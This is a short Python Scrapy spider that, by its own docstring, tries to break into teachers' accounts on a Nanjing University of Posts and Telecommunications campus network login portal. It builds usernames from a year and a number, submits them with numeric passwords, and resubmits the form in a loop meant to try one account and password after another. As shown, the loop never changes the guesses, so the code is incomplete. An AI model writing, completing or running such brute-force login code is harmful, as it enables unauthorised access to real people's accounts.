# -*- coding: utf-8 -*-
"""crawl NJUPT teachers' accounts"""
import scrapy
from NjuptDrCom.items import NjuptDrComItem

class TeacherAccountSpider(scrapy.Spider):
    """crawl NJUPT teachers' accounts"""
    name = 'account'
    start_urls = ['http://192.168.168.168/0.htm']
    year = 1960
    xxx = 000
    password = 000000

    def parse(self, response):
        username = '10100' + str(self.year) + '0' + str(self.xxx) + '00'
        password = str(self.password)
        yield scrapy.FormRequest.from_response(response=response,
                                               formdata={
                                                   # xxxx is year, xxx is random
                                                   'DDDDD': username,
                                                   'upass': password  # password
                                               },
                                               callback=self.cycle_login
                                              )

    def cycle_login(self, response):
        """try password and account again and again"""
        username = '10100' + str(self.year) + '0' + str(self.xxx) + '00'
        password = str(self.password)
        status = response.xpath('//input/@value').extract()
        if '返' in ''.join(map(str, status)):
            yield scrapy.FormRequest.from_response(response=response,
                                                   formdata={
                                                       # xxxx is year, xxx is random
                                                       'DDDDD': username,
                                                       'upass': password  # password
                                                   },
                                                   callback=self.cycle_login
                                                  )
